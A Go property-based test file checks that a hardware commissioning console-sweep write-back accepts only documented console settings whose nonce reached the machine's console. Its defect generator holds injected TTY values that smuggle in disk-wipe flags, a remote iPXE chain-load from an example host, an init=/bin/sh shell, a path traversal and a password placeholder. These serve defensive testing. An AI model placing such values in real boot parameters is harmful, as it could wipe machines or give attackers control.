package commission

// Property-based coverage for the console determination sweep write-back
// (consolesweep.go). The sweep result rides the commission report, which is
// written by the machine being commissioned; resolveConsoleSweep turns it
// into the device-type's slagworks_kernel_params, a shared NetBox field every
// device of that model inherits and that the boot handler then puts on each
// of those devices' deploy kernel command lines and into their bootloader
// configs.
//
// Contract (internal/model/consolesweep.go, docs/user/hardware/
// adding-new-hardware.md): the candidates are the fixed set
// model.ConsoleSweepTTYs probed at model.ConsoleSweepBaud, each with a random
// 16-hex-char nonce; the candidate "whose nonce arrived" over SOL wins and
// the value written is `console=<tty>,<baud>n8`.
//
// Oracle (independent of resolveConsoleSweep): a write is legitimate only if
// it is one of the finitely many strings the documented candidate set can
// produce, and only if the winning candidate's nonce is literally present in
// the machine's console stream. A candidate outside the documented set is
// never even looked for in the stream.

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"pgregory.net/rapid"

	"github.com/bluesky-social/slagworks/internal/model"
	"github.com/bluesky-social/slagworks/internal/netbox"
)

// streamScanner models store.ScanCastEventsForNonce: the nonce is found
// when it occurs literally in the machine's console bytes. It records every
// nonce it was asked for.
type streamScanner struct {
	mu     sync.Mutex
	stream string
	asked  []string
}

func (s *streamScanner) ScanCastEventsForNonce(_ context.Context, _ uuid.UUID, nonce string, _ time.Duration) (bool, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.asked = append(s.asked, nonce)
	return strings.Contains(s.stream, nonce), nil
}

var nonceRE = regexp.MustCompile(`^[0-9a-f]{16}$`)

// legitimateWrites is every value the documented candidate set can yield.
func legitimateWrites() map[string]bool {
	out := map[string]bool{}
	for _, tty := range model.ConsoleSweepTTYs {
		out[fmt.Sprintf("console=%s,%dn8", tty, model.ConsoleSweepBaud)] = true
	}
	return out
}

func genHexNonce() *rapid.Generator[string] {
	return rapid.StringMatching(`[0-9a-f]{16}`)
}

func genSweepCandidate(pool []string, allowDefects bool) *rapid.Generator[model.ConsoleSweepCandidate] {
	return rapid.Custom(func(t *rapid.T) model.ConsoleSweepCandidate {
		c := model.ConsoleSweepCandidate{
			TTY:   rapid.SampledFrom(model.ConsoleSweepTTYs).Draw(t, "tty"),
			Baud:  model.ConsoleSweepBaud,
			Nonce: rapid.SampledFrom(pool).Draw(t, "nonce"),
		}
		if !allowDefects {
			return c
		}
		// One field at a time leaves the documented value space.
		switch rapid.IntRange(0, 9).Draw(t, "defect") {
		case 0:
			c.TTY = rapid.SampledFrom([]string{
				"ttyS1,115200n8 slagworks.destructive slagworks.wipe_all_disks",
				"ttyS0\nchain http://203.0.113.9/x.ipxe",
				"ttyS0 systemd.run=/bin/false",
				"ttyS0,115200n8 init=/bin/sh",
				"ttyS9", "tty0", "", "ttyS0 ", "../etc/passwd", "ttyS1${password}",
			}).Draw(t, "bad_tty")
		case 1:
			c.Baud = rapid.SampledFrom([]int{0, -1, 9600, 57600, 1152000}).Draw(t, "bad_baud")
		case 2:
			c.Nonce = rapid.SampledFrom([]string{"", "%", "_", "a", "Linux", "________________", "%%"}).Draw(t, "bad_nonce")
		default:
		}
		return c
	})
}

// TestProp_ConsoleSweep_InContractCandidates: with every candidate inside the
// documented set, the winner is a candidate whose nonce reached the stream
// and a configured device-type is never overwritten.
func TestProp_ConsoleSweep_InContractCandidates(t *testing.T) {
	checkConsoleSweep(t, false)
}

// TestProp_ConsoleSweep_OnlyDocumentedCandidatesAreWritten: candidates that
// leave the documented set in tty, baud or nonce can neither win nor keep a
// documented candidate whose nonce arrived from winning.
func TestProp_ConsoleSweep_OnlyDocumentedCandidatesAreWritten(t *testing.T) {
	checkConsoleSweep(t, true)
}

func checkConsoleSweep(t *testing.T, allowDefects bool) {
	fastAttempts(t)
	legit := legitimateWrites()
	var nCases, nWrites, nHostileCand, nLegitHit int
	rapid.Check(t, func(t *rapid.T) {
		nCases++
		// Small nonce pool so candidates and the stream interact.
		pool := rapid.SliceOfN(genHexNonce(), 2, 4).Draw(t, "pool")
		cands := rapid.SliceOfN(genSweepCandidate(pool, allowDefects), 0, 4).Draw(t, "candidates")
		// The console stream: boot noise plus markers for a subset of the pool.
		var stream strings.Builder
		if rapid.IntRange(0, 5).Draw(t, "has_stream") > 0 {
			stream.WriteString("Linux version 6.8.0 (buildd@lcy02) ... [    0.000000] Command line: console=tty0\r\n")
			for _, n := range pool {
				if rapid.Bool().Draw(t, "landed") {
					fmt.Fprintf(&stream, "SLAG-CONSOLE-PROBE-%s-%s\n", uuid.Nil, n)
				}
			}
		}
		existing := rapid.SampledFrom([]string{"", "", "", "console=ttyS0,57600n8", "none"}).Draw(t, "existing")

		const deviceID, typeID = 42, 7
		nb := &fakeNetBox{
			devices:     map[int]*netbox.Device{deviceID: {ID: deviceID, DeviceType: &netbox.NestedRef{ID: typeID}}},
			deviceTypes: map[int]*netbox.DeviceType{typeID: {ID: typeID, Model: "NewBox 9000"}},
		}
		if existing != "" {
			nb.deviceTypes[typeID].CustomFields = []byte(fmt.Sprintf(`{"slagworks_kernel_params":%q}`, existing))
		}
		sc := &streamScanner{stream: stream.String()}
		h := New(&fakeStore{}, nb, nil)
		h.SetCastScanner(sc)
		h.resolveConsoleSweep(context.Background(), uuid.New(), deviceID, &model.ConsoleSweep{Candidates: cands})

		// Independent expectation: the documented candidates whose real
		// nonce is literally in the stream.
		wantable := map[string]bool{}
		for _, c := range cands {
			ok := false
			for _, tty := range model.ConsoleSweepTTYs {
				if c.TTY == tty {
					ok = true
				}
			}
			if !ok || c.Baud != model.ConsoleSweepBaud || !nonceRE.MatchString(c.Nonce) {
				nHostileCand++
				continue
			}
			if strings.Contains(sc.stream, c.Nonce) {
				wantable[fmt.Sprintf("console=%s,%dn8", c.TTY, c.Baud)] = true
			}
		}

		for _, asked := range sc.asked {
			if !nonceRE.MatchString(asked) {
				t.Fatalf("console stream scanned for %q, which is not a sweep nonce (candidates %+v)", asked, cands)
			}
		}

		got, wrote := nb.kernelParamsWrites[typeID]
		if existing != "" {
			if wrote {
				t.Fatalf("configured device-type (%q) overwritten with %q", existing, got)
			}
			return
		}
		if !wrote {
			if len(wantable) > 0 {
				t.Fatalf("a documented candidate's nonce reached the stream but nothing was written; wantable=%v", wantable)
			}
			return
		}
		nWrites++
		if !legit[got] {
			t.Fatalf("device-type slagworks_kernel_params written with %q, which no documented sweep candidate can produce (candidates %+v)", got, cands)
		}
		if !wantable[got] {
			t.Fatalf("device-type written with %q but that candidate's nonce never reached the console stream (candidates %+v, stream %q)", got, cands, sc.stream)
		}
		nLegitHit++
	})
	t.Logf("coverage: cases=%d writes=%d legit_writes=%d out_of_contract_candidates=%d", nCases, nWrites, nLegitHit, nHostileCand)
}
